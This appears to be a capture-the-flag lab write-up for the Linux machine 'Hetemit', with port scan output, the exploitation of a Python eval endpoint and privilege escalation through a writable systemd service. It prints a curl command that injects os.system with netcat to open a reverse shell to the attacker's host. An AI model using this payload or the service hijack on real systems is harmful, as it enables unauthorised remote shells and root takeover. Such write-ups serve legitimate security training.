---
Alias: Hetemit
Date: 7/18/2022
Platform: Linux
Difficulty: Intermediate
Tags: #os.systemCommandExecution #sudo/sbin/reboot
Status: Finished
IP: 192.168.56.117
---

# {{Hetemit}}


# Resolution summary
- Found an application that performs evaluation on port 50000
-  Typed curl -X post --data "code=os" to confirm if the application was running python as the nmap showed it was
- Ran an os.system netcat command to from curl and received a reverse shell
- Found a pythonapp.service was writable by our user
- Modified the pythonapp.service to start a reverse shell as root 
- Restarted the service and received a root shell


## Improved skills
- Learned curl -X POST --data option "code= " option
- os.system commands

## Used tools
- nmap
- rustscan

---

# Information Gathering
Scanned all TCP ports:
```bash
rustscan --addresses 192.168.127.117 --ulimit 5000 -- -A -sC -Pn -sV -T 1500
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/brian/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.127.117:21
Open 192.168.127.117:22
Open 192.168.127.117:80
Open 192.168.127.117:139
Open 192.168.127.117:445
Open 192.168.127.117:18000
Open 192.168.127.117:50000
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -A -sC -Pn -sV -T 1500" on ip 192.168.127.117
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-16 11:49 PDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:49
Completed NSE at 11:49, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:49
Completed NSE at 11:49, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:49
Completed NSE at 11:49, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 11:49
Completed Parallel DNS resolution of 1 host. at 11:49, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 11:49
Scanning 192.168.127.117 [7 ports]
Discovered open port 22/tcp on 192.168.127.117
Discovered open port 139/tcp on 192.168.127.117
Connect Scan Timing: About 35.71% done; ETC: 11:51 (0:01:21 remaining)
Discovered open port 445/tcp on 192.168.127.117
Discovered open port 80/tcp on 192.168.127.117
Connect Scan Timing: About 64.29% done; ETC: 11:51 (0:00:42 remaining)
Discovered open port 21/tcp on 192.168.127.117
Discovered open port 50000/tcp on 192.168.127.117
Discovered open port 18000/tcp on 192.168.127.117
Completed Connect Scan at 11:51, 108.01s elapsed (7 total ports)
Initiating Service scan at 11:51
Scanning 7 services on 192.168.127.117
Completed Service scan at 11:51, 41.02s elapsed (7 services on 1 host)
NSE: Script scanning 192.168.127.117.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:51
NSE: [ftp-bounce 192.168.127.117:21] PORT response: 500 Illegal PORT command.
NSE Timing: About 95.63% done; ETC: 11:52 (0:00:01 remaining)
NSE Timing: About 98.44% done; ETC: 11:52 (0:00:01 remaining)
Completed NSE at 11:53, 74.77s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:53
Completed NSE at 11:53, 3.62s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:53
Completed NSE at 11:53, 0.00s elapsed
Nmap scan report for 192.168.127.117
Host is up, received user-set (0.18s latency).
Scanned at 2022-10-16 11:49:35 PDT for 212s

PORT      STATE SERVICE     REASON  VERSION
21/tcp    open  ftp         syn-ack vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.49.127
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp    open  ssh         syn-ack OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 b1:e2:9d:f1:f8:10:db:a5:aa:5a:22:94:e8:92:61:65 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH2Cap49zuKy70lHzXsOn9iOap0h1Dnwk14D6PNKugueOqGpYoffwCGCA0wF4cI3+MRjuHz4xGznmtTIP3vOBZINZvT5PsNcvu6ef0SDfDOMFbzsEirhpQuoBYvgmEuJ4u1VMiwNaYQ0jw9t+nsR2MAIym/wdKt+ghYm4qlB3WvLMV41uCu0F7OQadRX8GWrLWLucjSQ1f80tkV7mc7ZfuTm8YdsAOkNQufHkVE+Alk0NpHdqLh/6FHxmEqYwP0jX6HS/lg+MfczIbIQ91v7+ljvo3qgdSZPqqulUtQuj/Rb/gmIfItzFZIxTzLQ6FuKKmoTMXaR/tXf93+91z+kBdDaZe/5eu6fLCdGuFyioB97LdZGJq8uFbM0BpNeBYc0i/DOFwxWBhO8/zzv1uaTUKuS1B+bny1iUTiQoJj6GVRQmvgk/2Km5SanF3Cp4PSSJMQ112Umjg1T61ah/i//KXAyZ25xOznolBw/aoCc9cremrkycUp7dmuATBNCgHFS0=
|   256 74:dd:fa:f2:51:dd:74:38:2b:b2:ec:82:e5:91:82:28 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPTMpDGmoKZ96W+Ivvw7sQmnD1U41OY34oAzJ5Z1/AP/iVj+TpKO6lCKPxDq+9nbJJU4dtQx8X+KjQqUtpYIUhw=
|   256 48:bc:9d:eb:bd:4d:ac:b3:0b:5d:67:da:56:54:2b:a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEUnTSrfkvL2AJJsozjPtXIWf/6Z7UB9WptTiOOX93m4
80/tcp    open  http        syn-ack Apache httpd 2.4.37 ((centos))
|_http-server-header: Apache/2.4.37 (centos)
| http-methods: 
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-title: CentOS \xE6\x8F\x90\xE4\xBE\x9B\xE7\x9A\x84 Apache HTTP \xE6\x9C\x8D\xE5\x8A\xA1\xE5\x99\xA8\xE6\xB5\x8B\xE8\xAF\x95\xE9\xA1\xB5
139/tcp   open  netbios-ssn syn-ack Samba smbd 4.6.2
445/tcp   open  netbios-ssn syn-ack Samba smbd 4.6.2
18000/tcp open  biimenu?    syn-ack
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 3102
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <title>Action Controller: Exception caught</title>
|     <style>
|     body {
|     background-color: #FAFAFA;
|     color: #333;
|     margin: 0px;
|     body, p, ol, ul, td {
|     font-family: helvetica, verdana, arial, sans-serif;
|     font-size: 13px;
|     line-height: 18px;
|     font-size: 11px;
|     white-space: pre-wrap;
|     pre.box {
|     border: 1px solid #EEE;
|     padding: 10px;
|     margin: 0px;
|     width: 958px;
|     header {
|     color: #F0F0F0;
|     background: #C52F24;
|     padding: 0.5em 1.5em;
|     margin: 0.2em 0;
|     line-height: 1.1em;
|     font-size: 2em;
|     color: #C52F24;
|     line-height: 25px;
|     .details {
|_    bord
50000/tcp open  http        syn-ack Werkzeug httpd 1.0.1 (Python 3.6.8)
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-server-header: Werkzeug/1.0.1 Python/3.6.8
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port18000-TCP:V=7.92%I=7%D=10/16%Time=634C52BA%P=aarch64-unknown-linux-
SF:gnu%r(GenericLines,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(G
SF:etRequest,C76,"HTTP/1\.0\x20403\x20Forbidden\r\nContent-Type:\x20text/h
SF:tml;\x20charset=UTF-8\r\nContent-Length:\x203102\r\n\r\n<!DOCTYPE\x20ht
SF:ml>\n<html\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20charset=\"utf-8\"\
SF:x20/>\n\x20\x20<title>Action\x20Controller:\x20Exception\x20caught</tit
SF:le>\n\x20\x20<style>\n\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x
SF:20background-color:\x20#FAFAFA;\n\x20\x20\x20\x20\x20\x20color:\x20#333
SF:;\n\x20\x20\x20\x20\x20\x20margin:\x200px;\n\x20\x20\x20\x20}\n\n\x20\x
SF:20\x20\x20body,\x20p,\x20ol,\x20ul,\x20td\x20{\n\x20\x20\x20\x20\x20\x2
SF:0font-family:\x20helvetica,\x20verdana,\x20arial,\x20sans-serif;\n\x20\
SF:x20\x20\x20\x20\x20font-size:\x20\x20\x2013px;\n\x20\x20\x20\x20\x20\x2
SF:0line-height:\x2018px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20pre\x20{\n
SF:\x20\x20\x20\x20\x20\x20font-size:\x2011px;\n\x20\x20\x20\x20\x20\x20wh
SF:ite-space:\x20pre-wrap;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20pre\.box\
SF:x20{\n\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#EEE;\n\x20\x2
SF:0\x20\x20\x20\x20padding:\x2010px;\n\x20\x20\x20\x20\x20\x20margin:\x20
SF:0px;\n\x20\x20\x20\x20\x20\x20width:\x20958px;\n\x20\x20\x20\x20}\n\n\x
SF:20\x20\x20\x20header\x20{\n\x20\x20\x20\x20\x20\x20color:\x20#F0F0F0;\n
SF:\x20\x20\x20\x20\x20\x20background:\x20#C52F24;\n\x20\x20\x20\x20\x20\x
SF:20padding:\x200\.5em\x201\.5em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h
SF:1\x20{\n\x20\x20\x20\x20\x20\x20margin:\x200\.2em\x200;\n\x20\x20\x20\x
SF:20\x20\x20line-height:\x201\.1em;\n\x20\x20\x20\x20\x20\x20font-size:\x
SF:202em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h2\x20{\n\x20\x20\x20\x20\
SF:x20\x20color:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20line-height:\x2025px
SF:;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\.details\x20{\n\x20\x20\x20\x2
SF:0\x20\x20bord")%r(HTTPOptions,C76,"HTTP/1\.0\x20403\x20Forbidden\r\nCon
SF:tent-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x203102\r\
SF:n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20<meta\x
SF:20charset=\"utf-8\"\x20/>\n\x20\x20<title>Action\x20Controller:\x20Exce
SF:ption\x20caught</title>\n\x20\x20<style>\n\x20\x20\x20\x20body\x20{\n\x
SF:20\x20\x20\x20\x20\x20background-color:\x20#FAFAFA;\n\x20\x20\x20\x20\x
SF:20\x20color:\x20#333;\n\x20\x20\x20\x20\x20\x20margin:\x200px;\n\x20\x2
SF:0\x20\x20}\n\n\x20\x20\x20\x20body,\x20p,\x20ol,\x20ul,\x20td\x20{\n\x2
SF:0\x20\x20\x20\x20\x20font-family:\x20helvetica,\x20verdana,\x20arial,\x
SF:20sans-serif;\n\x20\x20\x20\x20\x20\x20font-size:\x20\x20\x2013px;\n\x2
SF:0\x20\x20\x20\x20\x20line-height:\x2018px;\n\x20\x20\x20\x20}\n\n\x20\x
SF:20\x20\x20pre\x20{\n\x20\x20\x20\x20\x20\x20font-size:\x2011px;\n\x20\x
SF:20\x20\x20\x20\x20white-space:\x20pre-wrap;\n\x20\x20\x20\x20}\n\n\x20\
SF:x20\x20\x20pre\.box\x20{\n\x20\x20\x20\x20\x20\x20border:\x201px\x20sol
SF:id\x20#EEE;\n\x20\x20\x20\x20\x20\x20padding:\x2010px;\n\x20\x20\x20\x2
SF:0\x20\x20margin:\x200px;\n\x20\x20\x20\x20\x20\x20width:\x20958px;\n\x2
SF:0\x20\x20\x20}\n\n\x20\x20\x20\x20header\x20{\n\x20\x20\x20\x20\x20\x20
SF:color:\x20#F0F0F0;\n\x20\x20\x20\x20\x20\x20background:\x20#C52F24;\n\x
SF:20\x20\x20\x20\x20\x20padding:\x200\.5em\x201\.5em;\n\x20\x20\x20\x20}\
SF:n\n\x20\x20\x20\x20h1\x20{\n\x20\x20\x20\x20\x20\x20margin:\x200\.2em\x
SF:200;\n\x20\x20\x20\x20\x20\x20line-height:\x201\.1em;\n\x20\x20\x20\x20
SF:\x20\x20font-size:\x202em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h2\x20
SF:{\n\x20\x20\x20\x20\x20\x20color:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20
SF:line-height:\x2025px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\.details\x
SF:20{\n\x20\x20\x20\x20\x20\x20bord");
Service Info: OS: Unix

Host script results:
|_clock-skew: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 62974/tcp): CLEAN (Timeout)
|   Check 2 (port 56787/tcp): CLEAN (Timeout)
|   Check 3 (port 9774/udp): CLEAN (Timeout)
|   Check 4 (port 48068/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2022-10-16T18:52:40
|_  start_date: N/A

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:53
Completed NSE at 11:53, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:53
Completed NSE at 11:53, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:53
Completed NSE at 11:53, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 227.76 seconds

```

Enumerated open TCP ports:
```bash
50000
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 50000 Werkzeug httpd 1.0.1

#### -Per the nmap scan I navigated to http://192.168.56.117:50000 and found the following webpage:

![](Images/Pasted%20image%2020221016140831.png)

#### -Navigated to http://192.168.56.117:50000/verify as the previous webpage showed a "/verify" directory:
![](Images/Pasted%20image%2020221016152718.png)

#### -Typed "curl –X post –-data "code=2*2" http://192.168.56.117:50000/verify" and found the following output showing the application performs evaluation:
![](Images/Pasted%20image%2020221016152913.png)

---

# Exploitation
## os.system  Command Execution

#### -As found from the nmap scan port 50000 is running python 3.6 I typed "os" as a module and find the following showing the existence of it running python 3.6 module:
![](Images/Pasted%20image%2020221016153044.png)

#### -Ran a netcat listener on port 18000 and typed "curl -X POST --data "code=os.system('nc -e /bin/bash [kali IP] 18000')" http://192.168.241.117:50000/verify" and got a reverse shell:

![](Images/Pasted%20image%2020221016195553.png)
#os.systemCommandExecution

![](Images/Pasted%20image%2020221016155012.png)

---

# Privilege Escalation
## Local Enumeration

#### -Per typing "sudo –l" I found the following:

[+] We can sudo without supplying a password!
Matching Defaults entries for cmeeks on hetemit:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
 
User cmeeks may run the following commands on hetemit:
    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
	
#### -Per linpeas.sh I found I can write to "/etc/systemd/system/pythonapp.service":

![](Images/Pasted%20image%2020221016173419.png)

## Privilege Escalation vector
## Modifiable pythonapp.service

#### -Typed vi "/etc/systemd/system/pythonapp.service" and found the following:

[Unit]
Description=Python App
After=network-online.target
 
[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=flask run -h 0.0.0.0 -p 50000
TimeoutSec=30
RestartSec=15s
User=cmeeks
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure
 
[Install]
WantedBy=multi-user.target

#### -Modified the ExecStart and User lines, and removed the WorkingDirectory= line:

![](Images/Pasted%20image%2020221016185352.png)

#### - Downloaded a reverse shell named "reverse.sh" in the "/home/cmeeks/restjson_hetemit/" directory

#### -As "services" require to be restarted/system reboot to refresh whatever changes I made to the service app I typed "sudo /sbin/reboot" and system was rebooted

#### -I then got another reverse listener set up with port 1800 and received a root shell:

![](Images/Pasted%20image%2020221016193909.png)

---

